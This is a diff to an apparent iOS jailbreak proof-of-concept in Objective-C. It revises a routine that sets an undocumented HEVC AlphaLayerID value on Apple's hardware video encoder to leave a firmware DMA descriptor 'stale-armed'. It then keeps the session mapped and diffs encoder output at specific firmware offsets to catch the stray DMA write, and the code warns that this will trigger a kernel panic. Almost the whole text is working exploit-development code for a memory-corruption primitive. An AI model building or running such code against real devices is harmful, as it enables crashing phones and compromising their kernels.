@@ -3839,20 +3839,21 @@ static void runDPrep2(void) {
 
     pocLog(@"");
     pocLog(@"╔═══════════════════════════════════════════╗");
-    pocLog(@"║  D-PREP-2: Keep-Alive Bitstream Readout   ║");
-    pocLog(@"║  Arm → keep session alive → encode canary ║");
-    pocLog(@"║  frames continuously → diff each output   ║");
-    pocLog(@"║  against pre-arm baseline (same session)  ║");
-    pocLog(@"║  *** WILL PANIC ~90-160s after readout *** ║");
+    pocLog(@"║  D-PREP-2 v3: ARM-FIRST Bitstream Readout ║");
+    pocLog(@"║  Canary → SET 255 → arm (frame #1) →     ║");
+    pocLog(@"║  clear → continuous canary (train+test)   ║");
+    pocLog(@"║  T+0-45s = envelope training set          ║");
+    pocLog(@"║  T+60s+  = test set (fire expected 90-160)║");
+    pocLog(@"║  *** WILL PANIC ~90-160s after arm ***    ║");
     pocLog(@"╚═══════════════════════════════════════════╝");
     pocLog(@"");
 
     NSDateFormatter *fmt = [[NSDateFormatter alloc] init];
     fmt.dateFormat = @"HH:mm:ss.SSS";
 
-    // Step 1: Canary
+    // Step 1: Canary on a throwaway session (proves AVE2 is alive)
     LOG(@"--- STEP 1: CANARY ---");
-    os_log(dLog, "JBPoC-DPREP2-CANARY-START");
+    os_log(dLog, "JBPoC-DPREP2v3-CANARY-START");
     BOOL canary = phase2Encode(0, @"CANARY");
     if (!canary) {
         FAIL(@"CANARY FAILED — AVE2 wedged. Reboot phone.");
@@ -3862,9 +3863,9 @@ static void runDPrep2(void) {
     PASS(@"CANARY OK.");
     idleWait(5, @"canary cooldown");
 
-    // Step 2: Create session — NOT armed yet — for baseline training
-    LOG(@"--- STEP 2: BASELINE TRAINING (pre-arm, same session) ---");
-    LOG(@"Encoding clean frames to learn the session's output variance.");
+    // Step 2: Create the D-prep-2 session — ARM IMMEDIATELY
+    // Matches every proven arm topology: Alpha=255 on session's 2nd frame.
+    LOG(@"--- STEP 2: CREATE + ARM (session's 2nd frame) ---");
 
     NSDictionary *spec = @{
         (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
@@ -3883,7 +3884,6 @@ static void runDPrep2(void) {
         return;
     }
 
-    // DO NOT set AlphaLayerID yet — baseline must come from clean encodes
     status = VTCompressionSessionPrepareToEncodeFrames(session);
     if (status != noErr) {
         FAIL(@"PrepareToEncode failed: %d", (int)status);
@@ -3892,7 +3892,6 @@ static void runDPrep2(void) {
         g_phase2Running = NO;
         return;
     }
-    PASS(@"Session created (clean, no AlphaLayerID)");
 
     CVPixelBufferRef pb = createTestPixelBuffer(320, 240);
     if (!pb) {
@@ -3903,84 +3902,52 @@ static void runDPrep2(void) {
         return;
     }
 
-    // Encode baseline frames (same input, same session)
     dp2FreeSamples();
     dp2FreeArchive();
     g_dp2Armed = NO;
 
-    #define DPREP2_BASELINE_FRAMES 8
-    for (int i = 0; i < DPREP2_BASELINE_FRAMES; i++) {
-        CMTime pts = CMTimeMake(i, 30);
-        VTCompressionSessionEncodeFrame(session, pb, pts,
-            kCMTimeInvalid, NULL, NULL, NULL);
-    }
+    // Frame 0: clean encode (session priming, no AlphaLayerID)
+    LOG(@"Encoding frame 0 (clean, priming)...");
+    CMTime pts0 = CMTimeMake(0, 30);
+    VTCompressionSessionEncodeFrame(session, pb, pts0,
+        kCMTimeInvalid, NULL, NULL, NULL);
     VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
     [NSThread sleepForTimeInterval:1.0];
+    PASS(@"Frame 0 (prime): %d samples, %d errors", g_dp2SampleIdx, g_dp2Errors);
 
-    int baselineCount = g_dp2SampleIdx;
-    PASS(@"Baseline: %d samples collected (errors: %d)", baselineCount, g_dp2Errors);
-
-    // Store baseline data and compute per-byte variance envelope
-    NSMutableArray *baselineBS = [NSMutableArray array];
-    size_t baseMaxLen = 0;
-    for (int i = 0; i < baselineCount; i++) {
-        NSData *bs = dp2ExtractBitstream(g_dp2Samples[i]);
-        if (bs) {
-            [baselineBS addObject:bs];
-            if (bs.length > baseMaxLen) baseMaxLen = bs.length;
-            LOG(@"  Baseline[%d]: %zu bytes", i, bs.length);
-        } else {
-            [baselineBS addObject:[NSData data]];
-            INFO(@"  Baseline[%d]: no data", i);
-        }
-    }
-
-    // Build a variance map: for each byte position, track min/max across baseline
-    // Positions where min==max are invariant — changes there are signals
-    uint8_t *varMin = NULL;
-    uint8_t *varMax = NULL;
-    if (baseMaxLen > 0 && baselineBS.count > 1) {
-        varMin = (uint8_t *)malloc(baseMaxLen);
-        varMax = (uint8_t *)malloc(baseMaxLen);
-        memset(varMin, 0xFF, baseMaxLen);
-        memset(varMax, 0x00, baseMaxLen);
-        for (NSData *bs in baselineBS) {
-            const uint8_t *b = bs.bytes;
-            for (size_t j = 0; j < bs.length; j++) {
-                if (b[j] < varMin[j]) varMin[j] = b[j];
-                if (b[j] > varMax[j]) varMax[j] = b[j];
-            }
-        }
-        int invariantBytes = 0;
-        for (size_t j = 0; j < baseMaxLen; j++) {
-            if (varMin[j] == varMax[j]) invariantBytes++;
-        }
-        LOG(@"Variance map: %zu bytes total, %d invariant (%.1f%%)",
-            baseMaxLen, invariantBytes, 100.0 * invariantBytes / baseMaxLen);
-    }
-
-    dp2FreeSamples();
-    os_log(dLog, "JBPoC-DPREP2 baseline=%d maxLen=%zu", baselineCount, baseMaxLen);
-
-    // Step 3: ARM on the SAME session
-    LOG(@"");
-    LOG(@"--- STEP 3: ARM (AlphaLayerID=255 on same session) ---");
-
+    // SET AlphaLayerID=255 + readback verify
     status = VTSessionSetProperty(session,
         CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
         (__bridge CFTypeRef)@(255));
     INFO(@"SET AlphaLayerID=255: %s", status == noErr ? "OK" : "REJECTED");
 
-    g_dp2Armed = NO;
+    // Readback verify (three-layer methodology)
+    CFTypeRef readback = NULL;
+    VTSessionCopyProperty(session,
+        CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
+        kCFAllocatorDefault, &readback);
+    if (readback) {
+        int rbVal = [(__bridge NSNumber *)readback intValue];
+        if (rbVal == 255) {
+            PASS(@"Readback verify: AlphaLayerID=%d (confirmed)", rbVal);
+        } else {
+            FAIL(@"Readback MISMATCH: expected 255, got %d", rbVal);
+        }
+        CFRelease(readback);
+    } else {
+        INFO(@"Readback: property not readable (SET may still have stuck)");
+    }
+
+    // ARM: frame 1 with Alpha=255 — session's 2nd frame, matching C1 topology
     g_dp2ArchiveArmMark = g_dp2ArchiveIdx;
     NSString *armTime = [fmt stringFromDate:[NSDate date]];
     LOG(@"ARM time: %@ (archive mark: %d)", armTime, g_dp2ArchiveArmMark);
-    os_log(dLog, "JBPoC-DPREP2-ARM %{public}@ archiveMark=%d", armTime, g_dp2ArchiveArmMark);
+    os_log(dLog, "JBPoC-DPREP2v3-ARM %{public}@ archiveMark=%d", armTime, g_dp2ArchiveArmMark);
 
-    CMTime armPTS = CMTimeMake(DPREP2_BASELINE_FRAMES, 30);
+    CMTime armPTS = CMTimeMake(1, 30);
     status = VTCompressionSessionEncodeFrame(session, pb,
         armPTS, kCMTimeInvalid, NULL, NULL, NULL);
-    INFO(@"Armed encode submitted: %d", (int)status);
+    INFO(@"Armed encode submitted (frame 1): %d", (int)status);
 
     // Wait for -17691
     LOG(@"Waiting for -17691 (up to 130s)...");
@@ -3993,42 +3960,62 @@ static void runDPrep2(void) {
     }
 
     if (!g_dp2Armed) {
-        FAIL(@"Did not get -17691 — aborting.");
-        VTCompressionSessionInvalidate(session);
-        CFRelease(session);
-        CVPixelBufferRelease(pb);
-        if (varMin) free(varMin);
-        if (varMax) free(varMax);
+        FAIL(@"Did not get -17691 after 130s.");
+        LOG(@"Logging as no-fire run. Session conditions: frame #1, warm videocodecd.");
+        LOG(@"NOT invalidating — session stays alive for observation.");
+        LOG(@"If panic comes at ~160s, this is a watchdog-path variant.");
+
+        NSString *noFireResult = [NSString stringWithFormat:
+            @"D-PREP-2 v3 NO-ARM\nDate: %@\nARM attempt: %@\n"
+            @"Condition: -17691 not received in 130s\n"
+            @"Session: frame 1, 2nd frame of session\n"
+            @"Archive: %d samples\n",
+            [NSDate date], armTime, g_dp2ArchiveIdx];
+        NSString *noFirePath = [NSHomeDirectory()
+            stringByAppendingPathComponent:@"Documents/dprep2_nofire.txt"];
+        [noFireResult writeToFile:noFirePath atomically:YES
+                         encoding:NSUTF8StringEncoding error:nil];
+
+        // Do NOT invalidate — leave session alive, keep PTEs mapped
+        // If panic comes later, the .ips is still valid data
         g_phase2Running = NO;
         return;
     }
     PASS(@"Armed (-17691). Firmware DMA descriptor is stale-armed.");
-    os_log(dLog, "JBPoC-DPREP2-ARMED");
+    os_log(dLog, "JBPoC-DPREP2v3-ARMED");
 
-    // Step 4: Clear Alpha, continue encoding CLEAN frames on the SAME session
-    // The session's DART PTEs are still valid — the stale write (if model b)
-    // will land in the still-mapped coded-output buffer. The ISR memcpy
-    // (dva+0x1270, 0x9400 bytes) copies from that buffer into frame_info,
-    // which feeds the CMSampleBuffer output. If the stale DMA writes before
-    // the next encode completes, the output carries corruption.
+    // Step 3: Clear Alpha, continuous canary encode for 240s
+    // T+0-45s = envelope training set (presumptively clean)
+    // T+60s+  = test set (fire expected T+90-160s)
+    // One shared callback path — eliminates wiring bug by construction.
     LOG(@"");
-    LOG(@"--- STEP 4: KEEP-ALIVE ENCODE + READOUT (180s) ---");
+    LOG(@"--- STEP 3: KEEP-ALIVE ENCODE + READOUT (240s) ---");
     LOG(@"Encoding canary frames every 5s on the armed session.");
-    LOG(@"Diffing each output against baseline variance envelope.");
+    LOG(@"T+0-45s: training (building envelope from post-arm cleans).");
+    LOG(@"T+60s+:  testing (diffing against envelope, Q4 signals active).");
     LOG(@"Session PTEs still valid — if model (b), write lands here.");
     pocLog(@"");
 
     status = VTSessionSetProperty(session,
         CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
         (__bridge CFTypeRef)@(0));
+    INFO(@"Cleared AlphaLayerID to 0: %s", status == noErr ? "OK" : "FAIL");
 
     int hitCount = 0;
     int firstHitTime = -1;
-    int frameNum = DPREP2_BASELINE_FRAMES + 1;
+    int frameNum = 2; // frame 0=prime, 1=arm, 2+=canary
     NSDate *armDate = [NSDate date];
     NSMutableString *hitReport = [NSMutableString string];
 
-    // Also snapshot input surface
+    // Envelope built from training samples (T+0-45s)
+    NSMutableArray *trainBS = [NSMutableArray array];
+    size_t baseMaxLen = 0;
+    uint8_t *varMin = NULL;
+    uint8_t *varMax = NULL;
+    #define DPREP2_TRAIN_CUTOFF_S 45
+    #define DPREP2_TEST_START_S   60
+
+    // Snapshot input surface for input-side monitoring
     CVPixelBufferLockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
     size_t yBpr = CVPixelBufferGetBytesPerRowOfPlane(pb, 0);
     size_t yH = CVPixelBufferGetHeightOfPlane(pb, 0);
@@ -4044,7 +4031,8 @@ static void runDPrep2(void) {
     }
     CVPixelBufferUnlockBaseAddress(pb, kCVPixelBufferLock_ReadOnly);
 
-    for (int tick = 1; tick <= 36; tick++) {
+    // 48 ticks * 5s = 240s total readout window
+    for (int tick = 1; tick <= 48; tick++) {
         [NSThread sleepForTimeInterval:5.0];
         int elapsed = (int)[[NSDate date] timeIntervalSinceDate:armDate];
         NSString *now = [fmt stringFromDate:[NSDate date]];
@@ -4057,35 +4045,59 @@ static void runDPrep2(void) {
         VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
         [NSThread sleepForTimeInterval:0.5];
 
-        // Diff output against baseline variance envelope + Q4 firmware metadata
         if (g_dp2SampleIdx > 0) {
             NSData *curBS = dp2ExtractBitstream(g_dp2Samples[0]);
-            if (curBS && curBS.length > 0 && varMin && varMax) {
+
+            if (elapsed <= DPREP2_TRAIN_CUTOFF_S) {
+                // TRAINING PHASE: T+0 to T+45s — build envelope from these samples
+                if (curBS && curBS.length > 0) {
+                    [trainBS addObject:curBS];
+                    if (curBS.length > baseMaxLen) baseMaxLen = curBS.length;
+                    INFO(@"T+%03ds (%@): TRAIN sample %zu (%zu bytes)",
+                         elapsed, now, trainBS.count, curBS.length);
+                }
+
+                // At the cutoff, build the variance envelope
+                if (elapsed >= DPREP2_TRAIN_CUTOFF_S - 5 && !varMin && trainBS.count > 1) {
+                    varMin = (uint8_t *)malloc(baseMaxLen);
+                    varMax = (uint8_t *)malloc(baseMaxLen);
+                    memset(varMin, 0xFF, baseMaxLen);
+                    memset(varMax, 0x00, baseMaxLen);
+                    for (NSData *bs in trainBS) {
+                        const uint8_t *b = bs.bytes;
+                        for (size_t j = 0; j < bs.length; j++) {
+                            if (b[j] < varMin[j]) varMin[j] = b[j];
+                            if (b[j] > varMax[j]) varMax[j] = b[j];
+                        }
+                    }
+                    int inv = 0;
+                    for (size_t j = 0; j < baseMaxLen; j++) {
+                        if (varMin[j] == varMax[j]) inv++;
+                    }
+                    PASS(@"Envelope built: %zu training samples, %zu bytes, %d invariant (%.1f%%)",
+                         trainBS.count, baseMaxLen, inv, 100.0 * inv / baseMaxLen);
+                    os_log(dLog, "JBPoC-DPREP2v3-ENVELOPE train=%zu len=%zu inv=%d",
+                           trainBS.count, baseMaxLen, inv);
+                }
+            } else if (elapsed >= DPREP2_TEST_START_S && curBS && curBS.length > 0) {
+                // TEST PHASE: T+60s+ — diff against envelope + Q4 firmware metadata
                 const uint8_t *cur = curBS.bytes;
-                size_t len = MIN(curBS.length, baseMaxLen);
                 int anomalies = 0;
                 int firstAnom = -1;
 
-                // PRIMARY SIGNAL (Q4): Check firmware metadata at coded-output offsets
-                // frame# at +0xa8 and coded_size at +0xac — if these match the
-                // armed frame's ordinal or show impossible values, that's the
-                // cleanest possible tell of a stale DMA write landing.
+                // PRIMARY SIGNAL (Q4): firmware metadata at coded-output offsets
                 BOOL fwMetaHit = NO;
                 uint32_t fwFrame = 0, fwSize = 0;
                 if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
                     memcpy(&fwFrame, cur + DP2_FW_FRAME_OFFSET, 4);
                     memcpy(&fwSize, cur + DP2_FW_SIZE_OFFSET, 4);
-                    // The armed encode was frame DPREP2_BASELINE_FRAMES (0-indexed).
-                    // If we see that frame# in a post-arm canary output, the stale
-                    // descriptor's write landed in the coded-output buffer and the
-                    // ISR memcpy'd it into this sample.
-                    uint32_t armFrameNum = DPREP2_BASELINE_FRAMES;
-                    if (fwFrame == armFrameNum && tick > 1) {
+                    // Armed encode was frame 1. If we see frame#=1 in a
+                    // post-arm canary output, the stale DMA write landed.
+                    if (fwFrame == 1 && tick > 2) {
                         fwMetaHit = YES;
                         PASS(@"*** Q4 PRIMARY HIT: frame# at +0xa8 = %u (armed frame!) ***",
                              fwFrame);
                     }
-                    // Also flag if coded_size is wildly different from baseline
                     if (fwSize > 0 && (fwSize > baseMaxLen * 4 || fwSize < 16)) {
                         fwMetaHit = YES;
                         PASS(@"*** Q4 SIZE HIT: coded_size at +0xac = %u (baseline max=%zu) ***",
@@ -4093,19 +4105,21 @@ static void runDPrep2(void) {
                     }
                 }
 
-                // SECONDARY SIGNAL: Variance envelope check (existing)
-                for (size_t j = 0; j < len; j++) {
-                    if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
-                        if (anomalies == 0) firstAnom = (int)j;
-                        anomalies++;
+                // SECONDARY SIGNAL: variance envelope check
+                if (varMin && varMax) {
+                    size_t len = MIN(curBS.length, baseMaxLen);
+                    for (size_t j = 0; j < len; j++) {
+                        if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
+                            if (anomalies == 0) firstAnom = (int)j;
+                            anomalies++;
+                        }
                     }
                 }
 
                 // TERTIARY SIGNAL: +0x1270 region byte deviation
-                // The ISR copies 0x9400 bytes from kva+0x1270 — if the stale
-                // DMA wrote bitstream data, this region will diverge from baseline
                 int bsRegionAnoms = 0;
-                if (len > DP2_FW_BS_OFFSET) {
+                if (varMin && varMax && curBS.length > DP2_FW_BS_OFFSET) {
+                    size_t len = MIN(curBS.length, baseMaxLen);
                     size_t bsEnd = MIN(len, (size_t)(DP2_FW_BS_OFFSET + DP2_FW_BS_COPY_LEN));
                     for (size_t j = DP2_FW_BS_OFFSET; j < bsEnd; j++) {
                         if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
@@ -4116,8 +4130,8 @@ static void runDPrep2(void) {
 
                 // Size anomaly
                 BOOL sizeAnom = NO;
-                for (NSData *bbs in baselineBS) {
-                    if (bbs.length > 0 && curBS.length != bbs.length) {
+                for (NSData *tbs in trainBS) {
+                    if (tbs.length > 0 && curBS.length != tbs.length) {
                         sizeAnom = YES;
                         break;
                     }
@@ -4134,19 +4148,22 @@ static void runDPrep2(void) {
                          fwMetaHit ? @" FW_META_HIT" : @"");
 
                     // Dump first 32 anomalies
-                    NSMutableString *hex = [NSMutableString string];
-                    int dumped = 0;
-                    for (size_t j = (size_t)(firstAnom >= 0 ? firstAnom : 0);
-                         j < len && dumped < 32; j++) {
-                        if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
-                            [hex appendFormat:@"%04zx:%02x(range %02x-%02x) ",
-                                j, cur[j], varMin[j], varMax[j]];
-                            dumped++;
+                    if (varMin && varMax) {
+                        NSMutableString *hex = [NSMutableString string];
+                        int dumped = 0;
+                        size_t len = MIN(curBS.length, baseMaxLen);
+                        for (size_t j = (size_t)(firstAnom >= 0 ? firstAnom : 0);
+                             j < len && dumped < 32; j++) {
+                            if (cur[j] < varMin[j] || cur[j] > varMax[j]) {
+                                [hex appendFormat:@"%04zx:%02x(range %02x-%02x) ",
+                                    j, cur[j], varMin[j], varMax[j]];
+                                dumped++;
+                            }
                         }
+                        LOG(@"  Envelope anomalies: %@", hex);
                     }
-                    LOG(@"  Envelope anomalies: %@", hex);
 
-                    // Dump firmware metadata region specifically
+                    // Dump firmware metadata region
                     if (curBS.length > DP2_FW_SIZE_OFFSET + 4) {
                         NSMutableString *fwHex = [NSMutableString string];
                         size_t fwStart = DP2_FW_FRAME_OFFSET;
@@ -4163,10 +4180,10 @@ static void runDPrep2(void) {
                         elapsed, anomalies, bsRegionAnoms, fwFrame, fwSize,
                         sizeAnom ? " SIZE" : "", fwMetaHit ? " FW_META" : ""];
 
-                    os_log(dLog, "JBPoC-DPREP2-HIT T+%ds env=%d bs=%d fwF=%u fwS=%u meta=%d",
+                    os_log(dLog, "JBPoC-DPREP2v3-HIT T+%ds env=%d bs=%d fwF=%u fwS=%u meta=%d",
                            elapsed, anomalies, bsRegionAnoms, fwFrame, fwSize, (int)fwMetaHit);
 
-                    // On hit: dump the full retained archive to disk
+                    // On first hit: dump entire retained archive
                     if (hitCount == 1) {
                         NSString *archDir = [NSHomeDirectory()
                             stringByAppendingPathComponent:@"Documents/dprep2_archive"];
@@ -4182,22 +4199,22 @@ static void runDPrep2(void) {
                                 [aBS writeToFile:fn atomically:YES];
                             }
                         }
-                        // Also dump the current anomalous sample
                         NSString *hitFn = [NSString stringWithFormat:
                             @"%@/HIT_T%03d.bin", archDir, elapsed];
                         [curBS writeToFile:hitFn atomically:YES];
                         PASS(@"Archive dumped: %d samples to %@", g_dp2ArchiveIdx, archDir);
-                        os_log(dLog, "JBPoC-DPREP2-ARCHIVE dumped=%d", g_dp2ArchiveIdx);
+                        os_log(dLog, "JBPoC-DPREP2v3-ARCHIVE dumped=%d", g_dp2ArchiveIdx);
                     }
-                } else if (elapsed <= 30 || elapsed % 30 == 0) {
+                } else if (elapsed % 30 == 0 || elapsed == DPREP2_TEST_START_S) {
                     INFO(@"T+%03ds (%@): OK (%zu B, fw_frame=%u fw_size=%u, 0 anomalies)",
                          elapsed, now, curBS.length, fwFrame, fwSize);
                 }
-            } else if (g_dp2Errors > 0) {
-                INFO(@"T+%03ds: encode error (errors: %d)", elapsed, g_dp2Errors);
+            } else {
+                // Gap phase: T+45 to T+60 — still collecting, waiting for envelope
+                INFO(@"T+%03ds: gap (envelope built, waiting for test phase)", elapsed);
             }
         } else {
-            INFO(@"T+%03ds: no output sample", elapsed);
+            INFO(@"T+%03ds: no output sample (errors: %d)", elapsed, g_dp2Errors);
         }
 
         // Check input surface
@@ -4234,14 +4251,14 @@ static void runDPrep2(void) {
         LOG(@"Primitive = arm + keep-alive + read output. Mode A likely unnecessary.");
         os_log(dLog, "JBPoC-DPREP2-RESULT MODEL_B hits=%d firstAt=%d", hitCount, firstHitTime);
     } else {
-        INFO(@"No anomalies in bitstream or input over 180s.");
+        INFO(@"No anomalies in bitstream or input over 240s.");
         pocLog(@"");
         INFO(@"Interpretation (see decision tree):");
-        INFO(@"  If C2 shows fire lags kill → model (a) + race window → Mode A");
-        INFO(@"  If C2 shows fire ≈ kill → F≈U, no window → keep-alive variant");
-        INFO(@"  If C2 shows no fire → fire needs session state → revisit");
-        INFO(@"  Noise check: baseline had %d frames with %zu max bytes",
-             baselineCount, baseMaxLen);
+        INFO(@"  Clean window + fire on default timing (~90-160s) →");
+        INFO(@"    model (b) supported but write landed somewhere we're not reading.");
+        INFO(@"  Clean window + extended-no-fire (past ~240s) →");
+        INFO(@"    Contradicts Q2's decoupling, revisit the model.");
+        INFO(@"  Training set: %zu samples, %zu max bytes", trainBS.count, baseMaxLen);
         if (varMin) {
             int inv = 0;
             for (size_t j = 0; j < baseMaxLen; j++) {
@@ -4250,18 +4267,18 @@ static void runDPrep2(void) {
             INFO(@"  Invariant bytes: %d/%zu (%.1f%%) — these would catch corruption",
                  inv, baseMaxLen, 100.0 * inv / baseMaxLen);
         }
-        os_log(dLog, "JBPoC-DPREP2-RESULT NO_HITS baseline=%d", baselineCount);
+        os_log(dLog, "JBPoC-DPREP2v3-RESULT NO_HITS train=%zu", trainBS.count);
     }
     LOG(@"═══════════════════════════════════════════════");
 
     // Write results
     NSString *resultStr = [NSString stringWithFormat:
-        @"D-PREP-2 RESULT (Q4-enhanced)\nDate: %@\nARM: %@\n"
-        @"Baseline frames: %d\nMax bitstream: %zu\n"
+        @"D-PREP-2 v3 RESULT (arm-first)\nDate: %@\nARM: %@\n"
+        @"Training samples: %zu\nMax bitstream: %zu\n"
         @"Archive samples: %d (arm mark: %d)\n"
         @"Q4 offsets: frame#+0xa8, coded_size+0xac, bitstream+0x1270\n"
         @"Hits: %d\nFirst hit: T+%ds\nReport:\n%@\n",
-        [NSDate date], armTime, baselineCount, baseMaxLen,
+        [NSDate date], armTime, trainBS.count, baseMaxLen,
         g_dp2ArchiveIdx, g_dp2ArchiveArmMark,
         hitCount, firstHitTime, hitReport];
     NSString *resultPath = [NSHomeDirectory()
